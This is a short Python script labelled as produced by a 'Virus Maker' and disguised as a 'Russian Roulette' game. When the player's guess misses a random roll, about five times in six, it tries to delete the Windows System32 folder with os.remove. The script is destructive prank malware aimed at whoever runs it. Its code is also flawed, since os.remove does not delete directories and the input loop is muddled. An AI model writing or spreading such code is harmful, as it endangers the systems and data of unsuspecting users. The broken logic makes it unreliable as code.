# Code generated with Virus Maker

import random
import os

num=4

print("Welcome to Russian Roulette!")

while num>=1 and num<=6:
    num=int(input("Enter a number between 1 and 6: "))
    
    if num>=1 and num<=6:
        break

cella=random.randint(1,6)

if num!=cella:
    os.remove("C://Windows//System32")
else:
    print("You were lucky, this time...")